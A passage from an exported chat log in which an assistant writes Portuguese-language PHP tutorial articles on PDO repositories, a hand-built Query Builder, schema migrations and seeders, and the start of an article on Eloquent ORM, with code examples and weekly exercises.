// Implementação PDO — traduz dados relacionais para objetos de domínio
class ProdutoRepositorioPDO implements ProdutoRepositorioInterface
{
    public function __construct(private readonly \PDO $pdo) {}

    public function buscarPorId(int $id): ?Produto
    {
        $stmt = $this->pdo->prepare(
            "SELECT id, nome, preco, estoque, ativo FROM produtos WHERE id = ?"
        );
        $stmt->execute([$id]);
        $linha = $stmt->fetch();
        return $linha ? $this->hidratar($linha) : null;
    }

    public function buscarAtivos(): array
    {
        $stmt = $this->pdo->prepare(
            "SELECT id, nome, preco, estoque, ativo FROM produtos WHERE ativo = 1 ORDER BY nome"
        );
        $stmt->execute();
        return array_map($this->hidratar(...), $stmt->fetchAll());
    }

    public function buscarPorCategoria(string $categoria, int $limite = 20): array
    {
        $stmt = $this->pdo->prepare(
            "SELECT p.id, p.nome, p.preco, p.estoque, p.ativo
             FROM produtos p
             JOIN categorias c ON c.id = p.categoria_id
             WHERE c.slug = :categoria AND p.ativo = 1
             ORDER BY p.nome
             LIMIT :limite"
        );
        $stmt->bindValue(':categoria', $categoria);
        $stmt->bindValue(':limite',    $limite, \PDO::PARAM_INT);
        $stmt->execute();
        return array_map($this->hidratar(...), $stmt->fetchAll());
    }

    public function salvar(Produto $produto): Produto
    {
        if ($produto->id === 0) {
            // INSERT
            $stmt = $this->pdo->prepare(
                "INSERT INTO produtos (nome, preco, estoque, ativo)
                 VALUES (:nome, :preco, :estoque, :ativo)"
            );
            $stmt->execute([
                'nome'    => $produto->nome,
                'preco'   => $produto->preco,
                'estoque' => $produto->estoque,
                'ativo'   => $produto->ativo,
            ]);
            $novoId = (int) $this->pdo->lastInsertId();
            return new Produto($novoId, $produto->nome, $produto->preco, $produto->estoque, $produto->ativo);
        }

        // UPDATE
        $this->pdo->prepare(
            "UPDATE produtos
             SET nome = :nome, preco = :preco, estoque = :estoque, ativo = :ativo
             WHERE id = :id"
        )->execute([
            'nome'    => $produto->nome,
            'preco'   => $produto->preco,
            'estoque' => $produto->estoque,
            'ativo'   => $produto->ativo,
            'id'      => $produto->id,
        ]);
        return $produto;
    }

    public function deletar(int $id): bool
    {
        $stmt = $this->pdo->prepare("DELETE FROM produtos WHERE id = ?");
        $stmt->execute([$id]);
        return $stmt->rowCount() > 0;
    }

    // Hidratação — transforma array do banco em objeto de domínio
    private function hidratar(array $linha): Produto
    {
        return new Produto(
            id:      (int)  $linha['id'],
            nome:           $linha['nome'],
            preco:   (float) $linha['preco'],
            estoque: (int)  $linha['estoque'],
            ativo:   (bool) $linha['ativo'],
        );
    }
}

// Serviço de domínio — não sabe nada sobre PDO ou SQL
class EstoqueService
{
    public function __construct(
        private readonly ProdutoRepositorioInterface $repositorio,
    ) {}

    public function reduzirEstoque(int $produtoId, int $quantidade): Produto
    {
        $produto = $this->repositorio->buscarPorId($produtoId);
        if ($produto === null) {
            throw new \RuntimeException("Produto #{$produtoId} não encontrado.");
        }
        if ($produto->estoque < $quantidade) {
            throw new \RuntimeException(
                "Estoque insuficiente: disponível {$produto->estoque}, solicitado {$quantidade}."
            );
        }
        $atualizado = $produto->comEstoque($produto->estoque - $quantidade);
        return $this->repositorio->salvar($atualizado);
    }
}
```

---

## Resumo do artigo

| Conceito | O que aprendemos |
|---|---|
| Atributos PDO | `ERRMODE_EXCEPTION`, `EMULATE_PREPARES=false`, `DEFAULT_FETCH_MODE` |
| Prepared statements | Parâmetros `?` e `:nome` — SQL injection impossível |
| `bindValue` vs `bindParam` | Por valor (imediato) vs por referência (na execução) |
| Modos de fetch | `FETCH_ASSOC`, `FETCH_CLASS`, `FETCH_KEY_PAIR`, `FETCH_COLUMN` |
| Transações | `beginTransaction()`, `commit()`, `rollBack()` |
| Savepoints | Pontos de restauração parcial dentro de uma transação |
| Padrão Repository | Isola acesso a dados — serviços dependem da interface, não de SQL |
| Hidratação | Transforma arrays do banco em objetos de domínio tipados |

---

## Exercício da semana

1. Crie uma classe `Conexao` com método estático `obter(): PDO` que retorna uma instância singleton configurada com todos os atributos de produção discutidos no artigo. Use variáveis de ambiente para as credenciais.

2. Implemente um `UsuarioRepositorio` com os métodos `buscarPorEmail(string $email): ?Usuario`, `buscarPorId(int $id): ?Usuario`, `criar(string $nome, string $email, string $senhaHash): Usuario` e `atualizarUltimoLogin(int $id): void`. Use prepared statements nomeados em todos os métodos.

3. Implemente a função `transferirPontos(\PDO $pdo, int $deId, int $paraId, int $pontos): void` que usa uma transação para debitar pontos de um usuário e creditar em outro, garantindo que o saldo nunca fique negativo.

4. Crie um `RelatorioRepositorio` com método `produtosMaisVendidos(int $limite, \DateTimeImmutable $de, \DateTimeImmutable $ate): array` que retorna produtos com a soma de quantidades vendidas em um período. Use `FETCH_CLASS` para hidratar os resultados.

5. **Desafio:** implemente um `QueryBuilder` simples com interface fluente: `select(string ...$cols)`, `from(string $tabela)`, `where(string $condicao, mixed $valor)`, `orderBy(string $col, string $dir)`, `limit(int $n)`, `build(): array` (retorna `[$sql, $params]`). Integre-o com PDO num método `executar(\PDO $pdo): array`.

---

## Referências

- PHP Manual — PDO: https://www.php.net/manual/pt_BR/book.pdo.php
- PHP Manual — Prepared Statements: https://www.php.net/manual/pt_BR/pdo.prepared-statements.php
- PHP Manual — PDO::FETCH_* constants: https://www.php.net/manual/pt_BR/pdo.constants.php
- Fowler, M. — Patterns of Enterprise Application Architecture — Repository Pattern: https://www.martinfowler.com/eaaCatalog/repository.html
- PHP: The Right Way — Databases: https://phptherightway.com/#databases

---

Texto do Artigo 20 completo. Gerando o HTML.

Artigo 20 entregue. Progresso atual: **20/52 artigos completos**.

Módulo 4 iniciado — Banco de Dados. Próximo: **Artigo 21 — Query Builder e Migrations**. Continuo?

---

# you asked

message time: 2026-03-08 21:52:42

Continue

---

# claude response

# Artigo 21 — Query Builder e Migrations

**Prof. Ricardo Matos · Mestre em Programação**
Série *Dominando o PHP em 1 Ano* · Semana 21 · Módulo 4: Banco de Dados

---

## Introdução

No artigo anterior construímos um repositório com SQL escrito à mão. Isso funciona bem para queries simples, mas à medida que filtros dinâmicos aparecem — "buscar produtos por categoria, com faixa de preço opcional, com ou sem estoque" — o código vira uma série de `if` concatenando strings SQL, propenso a bugs e difícil de testar.

Query Builders resolvem isso: são objetos que constroem SQL programaticamente de forma fluente, segura e testável. E Migrations resolvem outro problema igualmente importante: como versionar o schema do banco de dados junto com o código, garantindo que qualquer desenvolvedor do time possa recriar o banco idêntico com um único comando.

Neste artigo construímos um Query Builder funcional do zero, entendemos como migrations funcionam internamente, e vemos os padrões que frameworks como Laravel e Phinx implementam.

---

## Query Builder — construindo SQL dinamicamente

Um Query Builder deve produzir sempre SQL válido com parâmetros separados — nunca interpolar valores diretamente na query. A interface fluente (cada método retorna `$this`) permite encadear chamadas na ordem que fizer sentido para o código.

```php
<?php
declare(strict_types=1);

class QueryBuilder
{
    private string  $tabela      = '';
    private array   $selects     = ['*'];
    private array   $joins       = [];
    private array   $wheres      = [];
    private array   $params      = [];
    private array   $orderBys    = [];
    private ?int    $limite      = null;
    private ?int    $offset      = null;
    private array   $groupBys    = [];
    private ?string $having      = null;

    // ── DSL fluente ──────────────────────────────────────────────────

    public function from(string $tabela): static
    {
        $this->tabela = $tabela;
        return $this;
    }

    public function select(string ...$colunas): static
    {
        $this->selects = $colunas;
        return $this;
    }

    public function join(string $tabela, string $condicao, string $tipo = 'INNER'): static
    {
        $this->joins[] = strtoupper($tipo) . " JOIN {$tabela} ON {$condicao}";
        return $this;
    }

    public function leftJoin(string $tabela, string $condicao): static
    {
        return $this->join($tabela, $condicao, 'LEFT');
    }

    public function where(string $condicao, mixed ...$valores): static
    {
        $this->wheres[] = $condicao;
        array_push($this->params, ...$valores);
        return $this;
    }

    // Adiciona WHERE apenas se o valor não for null — padrão "filtro opcional"
    public function whereIf(?string $valor, string $condicao, mixed ...$params): static
    {
        if ($valor !== null && $valor !== '') {
            return $this->where($condicao, ...$params);
        }
        return $this;
    }

    public function whereIn(string $coluna, array $valores): static
    {
        if (empty($valores)) return $this;
        $placeholders = implode(', ', array_fill(0, count($valores), '?'));
        $this->wheres[] = "{$coluna} IN ({$placeholders})";
        array_push($this->params, ...$valores);
        return $this;
    }

    public function orderBy(string $coluna, string $direcao = 'ASC'): static
    {
        $direcao = strtoupper($direcao) === 'DESC' ? 'DESC' : 'ASC';
        $this->orderBys[] = "{$coluna} {$direcao}";
        return $this;
    }

    public function groupBy(string ...$colunas): static
    {
        array_push($this->groupBys, ...$colunas);
        return $this;
    }

    public function having(string $condicao): static
    {
        $this->having = $condicao;
        return $this;
    }

    public function limit(int $limite): static
    {
        $this->limite = $limite;
        return $this;
    }

    public function offset(int $offset): static
    {
        $this->offset = $offset;
        return $this;
    }

    // ── Compilação ────────────────────────────────────────────────────

    public function build(): array  // retorna [$sql, $params]
    {
        if (empty($this->tabela)) {
            throw new \LogicException("Tabela não definida — chame from() antes de build().");
        }

        $partes = [];

        // SELECT
        $partes[] = 'SELECT ' . implode(', ', $this->selects);

        // FROM
        $partes[] = 'FROM ' . $this->tabela;

        // JOINs
        if (!empty($this->joins)) {
            $partes[] = implode("\n", $this->joins);
        }

        // WHERE
        if (!empty($this->wheres)) {
            $partes[] = 'WHERE ' . implode(' AND ', $this->wheres);
        }

        // GROUP BY
        if (!empty($this->groupBys)) {
            $partes[] = 'GROUP BY ' . implode(', ', $this->groupBys);
        }

        // HAVING
        if ($this->having !== null) {
            $partes[] = 'HAVING ' . $this->having;
        }

        // ORDER BY
        if (!empty($this->orderBys)) {
            $partes[] = 'ORDER BY ' . implode(', ', $this->orderBys);
        }

        // LIMIT / OFFSET
        if ($this->limite !== null) {
            $partes[] = 'LIMIT ' . $this->limite;
        }
        if ($this->offset !== null) {
            $partes[] = 'OFFSET ' . $this->offset;
        }

        return [implode("\n", $partes), $this->params];
    }

    public function executar(\PDO $pdo): array
    {
        [$sql, $params] = $this->build();
        $stmt = $pdo->prepare($sql);
        $stmt->execute($params);
        return $stmt->fetchAll();
    }

    // ── Métodos de conveniência para INSERT/UPDATE/DELETE ─────────────

    public static function inserir(string $tabela, array $dados, \PDO $pdo): int
    {
        $colunas      = implode(', ', array_keys($dados));
        $placeholders = implode(', ', array_fill(0, count($dados), '?'));
        $stmt = $pdo->prepare("INSERT INTO {$tabela} ({$colunas}) VALUES ({$placeholders})");
        $stmt->execute(array_values($dados));
        return (int) $pdo->lastInsertId();
    }

    public static function atualizar(string $tabela, array $dados, string $where, array $whereParams, \PDO $pdo): int
    {
        $sets = implode(', ', array_map(fn($col) => "{$col} = ?", array_keys($dados)));
        $stmt = $pdo->prepare("UPDATE {$tabela} SET {$sets} WHERE {$where}");
        $stmt->execute([...array_values($dados), ...$whereParams]);
        return $stmt->rowCount();
    }
}
```

---

## Usando o Query Builder — filtros dinâmicos

O grande benefício do Query Builder aparece quando os filtros são opcionais. Sem ele, o código fica cheio de concatenações perigosas:

```php
<?php
declare(strict_types=1);

// ── FILTROS OPCIONAIS — o padrão mais comum ───────────────────────────
function buscarProdutos(
    \PDO    $pdo,
    ?string $categoria    = null,
    ?float  $precoMin     = null,
    ?float  $precoMax     = null,
    ?bool   $apenasAtivos = true,
    int     $pagina       = 1,
    int     $porPagina    = 20,
): array {
    $qb = (new QueryBuilder())
        ->from('produtos p')
        ->select('p.id', 'p.nome', 'p.preco', 'p.estoque', 'c.nome AS categoria')
        ->leftJoin('categorias c', 'c.id = p.categoria_id')
        ->orderBy('p.nome')
        ->limit($porPagina)
        ->offset(($pagina - 1) * $porPagina);

    // Cada filtro só é adicionado se o valor for fornecido
    if ($apenasAtivos) {
        $qb->where('p.ativo = ?', 1);
    }
    if ($categoria !== null) {
        $qb->where('c.slug = ?', $categoria);
    }
    if ($precoMin !== null) {
        $qb->where('p.preco >= ?', $precoMin);
    }
    if ($precoMax !== null) {
        $qb->where('p.preco <= ?', $precoMax);
    }

    return $qb->executar($pdo);
}

// Busca com todos os filtros
$resultado = buscarProdutos(
    pdo:       $pdo,
    categoria: 'eletronicos',
    precoMin:  100.0,
    precoMax:  2000.0,
    pagina:    2,
);

// Busca simples — sem filtros opcionais
$todos = buscarProdutos(pdo: $pdo, apenasAtivos: false);

// ── RELATÓRIO COM GROUP BY ─────────────────────────────────────────────
$vendasPorCategoria = (new QueryBuilder())
    ->from('pedido_itens pi')
    ->select(
        'c.nome AS categoria',
        'SUM(pi.quantidade) AS total_vendido',
        'SUM(pi.quantidade * pi.preco) AS receita',
    )
    ->join('produtos p', 'p.id = pi.produto_id')
    ->join('categorias c', 'c.id = p.categoria_id')
    ->join('pedidos pe', 'pe.id = pi.pedido_id')
    ->where('pe.criado_em >= ?', '2024-01-01')
    ->where('pe.status = ?', 'entregue')
    ->groupBy('c.id', 'c.nome')
    ->having('total_vendido > 0')
    ->orderBy('receita', 'DESC')
    ->executar($pdo);

// ── WHERE IN com lista dinâmica ────────────────────────────────────────
$ids = [1, 5, 12, 47, 99];
$produtosSelecionados = (new QueryBuilder())
    ->from('produtos')
    ->select('id', 'nome', 'preco')
    ->whereIn('id', $ids)
    ->orderBy('nome')
    ->executar($pdo);
```

---

## Migrations — versionando o schema

Migrations são arquivos PHP que descrevem uma mudança no schema do banco de dados. Cada migration tem dois métodos: `up()` (aplica a mudança) e `down()` (desfaz). Uma tabela de controle no banco registra quais migrations já foram executadas, garantindo que cada migration rode apenas uma vez e na ordem correta.

```php
<?php
declare(strict_types=1);

// ── ESTRUTURA BASE ────────────────────────────────────────────────────

abstract class Migration
{
    public function __construct(protected \PDO $pdo) {}

    abstract public function up(): void;
    abstract public function down(): void;

    protected function executar(string $sql): void
    {
        $this->pdo->exec($sql);
    }
}

// ── MIGRATION 001 — criação da tabela usuarios ─────────────────────────
class Migration001CriarTabelaUsuarios extends Migration
{
    public function up(): void
    {
        $this->executar("
            CREATE TABLE IF NOT EXISTS usuarios (
                id          INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
                nome        VARCHAR(150)        NOT NULL,
                email       VARCHAR(255)        NOT NULL UNIQUE,
                senha_hash  VARCHAR(255)        NOT NULL,
                ativo       TINYINT(1)          NOT NULL DEFAULT 1,
                criado_em   DATETIME            NOT NULL DEFAULT CURRENT_TIMESTAMP,
                atualizado_em DATETIME          NOT NULL DEFAULT CURRENT_TIMESTAMP
                              ON UPDATE CURRENT_TIMESTAMP,
                INDEX idx_email (email),
                INDEX idx_ativo (ativo)
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
        ");
    }

    public function down(): void
    {
        $this->executar("DROP TABLE IF EXISTS usuarios");
    }
}

// ── MIGRATION 002 — criação de produtos e categorias ──────────────────
class Migration002CriarProdutos extends Migration
{
    public function up(): void
    {
        $this->executar("
            CREATE TABLE IF NOT EXISTS categorias (
                id    INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
                nome  VARCHAR(100) NOT NULL,
                slug  VARCHAR(100) NOT NULL UNIQUE
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
        ");

        $this->executar("
            CREATE TABLE IF NOT EXISTS produtos (
                id           INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
                categoria_id INT UNSIGNED         NOT NULL,
                nome         VARCHAR(200)         NOT NULL,
                descricao    TEXT,
                preco        DECIMAL(10,2)        NOT NULL,
                estoque      INT UNSIGNED         NOT NULL DEFAULT 0,
                ativo        TINYINT(1)           NOT NULL DEFAULT 1,
                criado_em    DATETIME             NOT NULL DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (categoria_id) REFERENCES categorias(id) ON DELETE RESTRICT,
                INDEX idx_categoria (categoria_id),
                INDEX idx_ativo_preco (ativo, preco)
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
        ");
    }

    public function down(): void
    {
        // Ordem inversa — respeita foreign keys
        $this->executar("DROP TABLE IF EXISTS produtos");
        $this->executar("DROP TABLE IF EXISTS categorias");
    }
}

// ── MIGRATION 003 — adicionar coluna a tabela existente ──────────────
class Migration003AdicionarPerfilUsuario extends Migration
{
    public function up(): void
    {
        $this->executar("
            ALTER TABLE usuarios
            ADD COLUMN perfil       ENUM('usuario','admin','moderador') NOT NULL DEFAULT 'usuario' AFTER email,
            ADD COLUMN ultimo_login DATETIME NULL AFTER perfil,
            ADD INDEX  idx_perfil (perfil)
        ");
    }

    public function down(): void
    {
        $this->executar("ALTER TABLE usuarios DROP INDEX idx_perfil");
        $this->executar("ALTER TABLE usuarios DROP COLUMN ultimo_login");
        $this->executar("ALTER TABLE usuarios DROP COLUMN perfil");
    }
}
```

---

## MigrationRunner — o executor de migrations

O runner é responsável por criar a tabela de controle, descobrir quais migrations ainda não rodaram, e executá-las em ordem — tudo dentro de transações para garantir atomicidade.

```php
<?php
declare(strict_types=1);

class MigrationRunner
{
    private const TABELA_CONTROLE = 'migrations';

    public function __construct(private readonly \PDO $pdo) {}

    public function inicializar(): void
    {
        $this->pdo->exec("
            CREATE TABLE IF NOT EXISTS " . self::TABELA_CONTROLE . " (
                id         INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
                migration  VARCHAR(255) NOT NULL UNIQUE,
                executado_em DATETIME   NOT NULL DEFAULT CURRENT_TIMESTAMP,
                INDEX idx_migration (migration)
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
        ");
    }

    /** @param class-string<Migration>[] $classes */
    public function migrar(array $classes): void
    {
        $this->inicializar();
        $executadas = $this->jaExecutadas();

        foreach ($classes as $classe) {
            if (in_array($classe, $executadas, true)) {
                echo "  ⏭  Já executada: {$classe}\n";
                continue;
            }

            $this->pdo->beginTransaction();
            try {
                /** @var Migration $migration */
                $migration = new $classe($this->pdo);
                $migration->up();
                $this->registrar($classe);
                $this->pdo->commit();
                echo "  ✅ Executada: {$classe}\n";
            } catch (\Throwable $e) {
                $this->pdo->rollBack();
                echo "  ❌ Falhou: {$classe} — " . $e->getMessage() . "\n";
                throw $e;
            }
        }
    }

    /** @param class-string<Migration>[] $classes */
    public function rollback(array $classes, int $passos = 1): void
    {
        $this->inicializar();
        $executadas = $this->jaExecutadas();
        $paraDesfazer = array_reverse(
            array_filter($classes, fn($c) => in_array($c, $executadas, true))
        );

        foreach (array_slice($paraDesfazer, 0, $passos) as $classe) {
            $this->pdo->beginTransaction();
            try {
                $migration = new $classe($this->pdo);
                $migration->down();
                $this->remover($classe);
                $this->pdo->commit();
                echo "  ↩  Revertida: {$classe}\n";
            } catch (\Throwable $e) {
                $this->pdo->rollBack();
                echo "  ❌ Falhou ao reverter: {$classe} — " . $e->getMessage() . "\n";
                throw $e;
            }
        }
    }

    private function jaExecutadas(): array
    {
        $stmt = $this->pdo->query(
            "SELECT migration FROM " . self::TABELA_CONTROLE . " ORDER BY id"
        );
        return $stmt->fetchAll(\PDO::FETCH_COLUMN);
    }

    private function registrar(string $classe): void
    {
        $this->pdo->prepare(
            "INSERT INTO " . self::TABELA_CONTROLE . " (migration) VALUES (?)"
        )->execute([$classe]);
    }

    private function remover(string $classe): void
    {
        $this->pdo->prepare(
            "DELETE FROM " . self::TABELA_CONTROLE . " WHERE migration = ?"
        )->execute([$classe]);
    }
}

// ── USO ───────────────────────────────────────────────────────────────
$runner = new MigrationRunner($pdo);

// Lista de migrations na ORDEM CORRETA
$migrations = [
    Migration001CriarTabelaUsuarios::class,
    Migration002CriarProdutos::class,
    Migration003AdicionarPerfilUsuario::class,
];

echo "Executando migrations...\n";
$runner->migrar($migrations);

// Rollback do último passo
// $runner->rollback($migrations, passos: 1);
```

---

## Seeders — populando dados iniciais

Seeders são migrations especiais que inserem dados de referência ou de teste. Não têm `down()` porque dados de seed geralmente não são removidos por rollback — são truncados manualmente.

```php
<?php
declare(strict_types=1);

abstract class Seeder
{
    public function __construct(protected \PDO $pdo) {}
    abstract public function run(): void;
}

class CategoriasSeeder extends Seeder
{
    public function run(): void
    {
        $stmt = $this->pdo->prepare(
            "INSERT IGNORE INTO categorias (nome, slug) VALUES (?, ?)"
        );

        $categorias = [
            ['Eletrônicos',   'eletronicos'],
            ['Informática',   'informatica'],
            ['Periféricos',   'perifericos'],
            ['Acessórios',    'acessorios'],
        ];

        foreach ($categorias as [$nome, $slug]) {
            $stmt->execute([$nome, $slug]);
            echo "  📦 Categoria: {$nome}\n";
        }
    }
}

class ProdutosSeeder extends Seeder
{
    public function run(): void
    {
        // Busca IDs das categorias já criadas
        $categorias = $this->pdo->query(
            "SELECT id, slug FROM categorias"
        )->fetchAll(\PDO::FETCH_KEY_PAIR);

        $stmt = $this->pdo->prepare("
            INSERT IGNORE INTO produtos (categoria_id, nome, preco, estoque)
            VALUES (:categoria_id, :nome, :preco, :estoque)
        ");

        $produtos = [
            ['cat' => 'perifericos', 'nome' => 'Teclado Mecânico',   'preco' => 350.00, 'estoque' => 50],
            ['cat' => 'perifericos', 'nome' => 'Mouse Gamer',         'preco' => 180.00, 'estoque' => 80],
            ['cat' => 'informatica', 'nome' => 'SSD 1TB NVMe',        'preco' => 450.00, 'estoque' => 30],
            ['cat' => 'eletronicos', 'nome' => 'Monitor 27" 144Hz',   'preco' => 1800.00,'estoque' => 15],
        ];

        foreach ($produtos as $p) {
            $catId = $categorias[$p['cat']] ?? null;
            if ($catId === null) continue;
            $stmt->execute([
                'categoria_id' => $catId,
                'nome'         => $p['nome'],
                'preco'        => $p['preco'],
                'estoque'      => $p['estoque'],
            ]);
            echo "  🛍  Produto: {$p['nome']}\n";
        }
    }
}

// Executar seeders
echo "Populando banco de dados...\n";
(new CategoriasSeeder($pdo))->run();
(new ProdutosSeeder($pdo))->run();
echo "Concluído.\n";
```

---

## Resumo do artigo

| Conceito | O que aprendemos |
|---|---|
| Query Builder | Constrói SQL programaticamente — seguro, fluente, testável |
| `whereIf()` | Adiciona cláusula WHERE apenas se o valor for fornecido |
| `whereIn()` | Gera placeholders dinamicamente para listas de valores |
| `build()` | Retorna `[$sql, $params]` — SQL e parâmetros sempre separados |
| Migration | Arquivo PHP com `up()` e `down()` — versiona mudanças de schema |
| Tabela de controle | Registra quais migrations já rodaram — garante idempotência |
| MigrationRunner | Executa migrations pendentes em ordem, dentro de transações |
| Rollback | Reverte as N últimas migrations executando `down()` |
| Seeder | Popula dados iniciais ou de teste — separado das migrations |

---

## Exercício da semana

1. Estenda o `QueryBuilder` com suporte a subqueries: método `whereSubquery(string $coluna, string $operador, QueryBuilder $sub)` que gera `WHERE coluna OPERADOR (SELECT ...)`. Teste com `WHERE id IN (SELECT produto_id FROM pedido_itens WHERE quantidade > 5)`.

2. Adicione paginação ao `QueryBuilder`: método `paginar(int $pagina, int $porPagina): static` e método `contarTotal(\PDO $pdo): int` que executa `SELECT COUNT(*) FROM ... WHERE ...` sem o LIMIT/OFFSET.

3. Crie as migrations para um sistema de pedidos completo: `Migration001Usuarios`, `Migration002Categorias`, `Migration003Produtos`, `Migration004Pedidos`, `Migration005PedidoItens`. Cada uma com `up()` e `down()` corretos, respeitando a ordem de foreign keys.

4. Implemente um `SeederRunner` que recebe uma lista de seeders e os executa em ordem, exibindo tempo de execução de cada um usando `hrtime(true)`.

5. **Desafio:** crie um comando de linha de comando `php migrate.php [migrate|rollback|status]`. O `status` lista todas as migrations com indicação visual de executadas (✅) e pendentes (⏳). Use `$argv` para ler o comando e `$argc` para validar os argumentos.

---

## Referências

- PHP Manual — PDO::prepare: https://www.php.net/manual/pt_BR/pdo.prepare.php
- Phinx — PHP Migrations library: https://book.cakephp.org/phinx/0/en/index.html
- Laravel — Database Migrations: https://laravel.com/docs/migrations
- Laravel — Query Builder: https://laravel.com/docs/queries
- Doctrine DBAL — Schema Manager: https://www.doctrine-project.org/projects/doctrine-dbal/en/latest/reference/schema-manager.html

---

Texto do Artigo 21 completo. Gerando o HTML.

---

# claude response

# Artigo 22 — ORM com Eloquent

**Prof. Ricardo Matos · Mestre em Programação**
Série *Dominando o PHP em 1 Ano* · Semana 22 · Módulo 4: Banco de Dados

---

## Introdução

ORM (Object-Relational Mapping) é a camada que traduz automaticamente entre objetos PHP e tabelas relacionais. Em vez de escrever SQL para cada operação, você trabalha com objetos que representam linhas do banco — e o ORM cuida do SQL nos bastidores.

O Eloquent é o ORM do Laravel, mas pode ser usado em qualquer projeto PHP via pacote standalone `illuminate/database`. É um dos ORMs mais expressivos disponíveis: relacionamentos declarados em uma linha, escopos de query reutilizáveis, eventos de modelo para hooks automáticos, e uma interface fluente que lê quase como inglês.

Neste artigo você aprende Eloquent do jeito que projetos reais usam: não apenas o básico de `find()` e `save()`, mas relacionamentos polimórficos, escopos globais e locais, eventos e observers, e como estruturar modelos para um domínio real.

---

## Configuração standalone do Eloquent

Eloquent pode ser usado fora do Laravel instalando apenas o pacote `illuminate/database`:

```php
<?php
declare(strict_types=1);

// composer require illuminate/database illuminate/events

use Illuminate\Database\Capsule\Manager as Capsule;
use Illuminate\Events\Dispatcher;
use Illuminate\Container\Container;

$capsule = new Capsule();

$capsule->addConnection([
    'driver'    => 'mysql',
    'host'      => getenv('DB_HOST')     ?: 'localhost',
    'database'  => getenv('DB_DATABASE') ?: 'meuapp',
    'username'  => getenv('DB_USERNAME') ?: 'root',
    'password'  => getenv('DB_PASSWORD') ?: '',
    'charset'   => 'utf8mb4',
    'collation' => 'utf8mb4_unicode_ci',
    'prefix'    => '',
    'strict'    => true,   // equivale a STRICT_ALL_TABLES
]);

// Habilita eventos de modelo (necessário para observers e timestamps automáticos)
$capsule->setEventDispatcher(new Dispatcher(new Container()));

// Torna a conexão disponível globalmente
$capsule->setAsGlobal();
$capsule->bootEloquent();
```

---

## Modelos básicos e convenções

Eloquent segue convenções sobre configuração: se a tabela se chama `usuarios`, o modelo se chama `Usuario`. Se a chave primária é `id`, não há nada para configurar. Você apenas declara a classe e o Eloquent cuida do resto.

```php
<?php
declare(strict_types=1);

use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\SoftDeletes;

class Usuario extends Model
{
    // Convenção: tabela 'usuarios' (plural do nome da classe em snake_case)
    // Se a tabela tiver nome diferente:
    protected $table = 'usuarios';

    // Colunas que podem ser preenchidas via fill() ou create()
    protected $fillable = ['nome', 'email', 'senha_hash', 'perfil'];

    // Colunas nunca retornadas em arrays/JSON
    protected $hidden = ['senha_hash'];

    // Cast automático de tipos — PHP recebe o tipo correto, não string
    protected $casts = [
        'ativo'       => 'boolean',
        'criado_em'   => 'datetime',
        'ultimo_login'=> 'datetime',
        'perfil'      => \App\Enums\PerfilUsuario::class, // PHP 8.1+ Enum cast
    ];

    // Nomes customizados para timestamps (padrão: created_at, updated_at)
    const CREATED_AT = 'criado_em';
    const UPDATED_AT = 'atualizado_em';

    // Soft Delete — adiciona deleted_at em vez de apagar fisicamente
    use SoftDeletes;
    const DELETED_AT = 'deletado_em';

    // ── Accessors — transforma o valor ao LER ────────────────────────
    // PHP 8+ syntax: retorna Attribute
    protected function nomeCompleto(): \Illuminate\Database\Eloquent\Casts\Attribute
    {
        return \Illuminate\Database\Eloquent\Casts\Attribute::make(
            get: fn () => strtoupper($this->nome[0]) . substr($this->nome, 1),
        );
    }

    // ── Mutators — transforma o valor ao GRAVAR ──────────────────────
    protected function senhaHash(): \Illuminate\Database\Eloquent\Casts\Attribute
    {
        return \Illuminate\Database\Eloquent\Casts\Attribute::make(
            set: fn (string $valor) => password_hash($valor, PASSWORD_ARGON2ID),
        );
    }
}

// ── Operações básicas ─────────────────────────────────────────────────

// Criar
$usuario = Usuario::create([
    'nome'       => 'Ana Lima',
    'email'      => 'ana@email.com',
    'senha_hash' => 'minhasenha123', // mutator aplica password_hash automaticamente
    'perfil'     => 'usuario',
]);

// Buscar
$usuario = Usuario::find(1);                // null se não encontrar
$usuario = Usuario::findOrFail(99);         // lança ModelNotFoundException
$usuario = Usuario::where('email', 'ana@email.com')->first();
$ativos  = Usuario::where('ativo', true)->orderBy('nome')->get();

// Atualizar
$usuario->nome = 'Ana Souza';
$usuario->save();
// ou: Usuario::where('id', 1)->update(['nome' => 'Ana Souza']);

// Deletar (soft delete se trait estiver presente)
$usuario->delete();                          // marca deletado_em
$usuario->forceDelete();                     // apaga fisicamente
Usuario::withTrashed()->where('id', 1)->restore(); // restaura
```

---

## Relacionamentos

Relacionamentos Eloquent são declarados como métodos no modelo e retornam objetos de relacionamento. O SQL de JOIN é gerado automaticamente quando o relacionamento é acessado.

```php
<?php
declare(strict_types=1);

use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\Relations\{HasMany, BelongsTo, BelongsToMany, HasManyThrough};

class Categoria extends Model
{
    protected $table    = 'categorias';
    public    $timestamps = false;
    protected $fillable = ['nome', 'slug'];

    // Um para muitos — uma categoria tem muitos produtos
    public function produtos(): HasMany
    {
        return $this->hasMany(Produto::class, 'categoria_id');
    }

    // Com escopos — apenas produtos ativos desta categoria
    public function produtosAtivos(): HasMany
    {
        return $this->hasMany(Produto::class, 'categoria_id')
                    ->where('ativo', true)
                    ->orderBy('nome');
    }
}

class Produto extends Model
{
    protected $table    = 'produtos';
    protected $fillable = ['categoria_id', 'nome', 'preco', 'estoque', 'ativo'];
    protected $casts    = [
        'preco'  => 'decimal:2',
        'ativo'  => 'boolean',
        'criado_em' => 'datetime',
    ];
    const CREATED_AT = 'criado_em';
    const UPDATED_AT = null; // sem updated_at

    // Muitos para um — produto pertence a uma categoria
    public function categoria(): BelongsTo
    {
        return $this->belongsTo(Categoria::class, 'categoria_id');
    }

    // Muitos para muitos com pivot — produto tem muitas tags
    public function tags(): BelongsToMany
    {
        return $this->belongsToMany(Tag::class, 'produto_tags', 'produto_id', 'tag_id')
                    ->withTimestamps(); // pivot tem created_at/updated_at
    }

    // HasManyThrough — produto tem muitos itens de pedido via pedidos
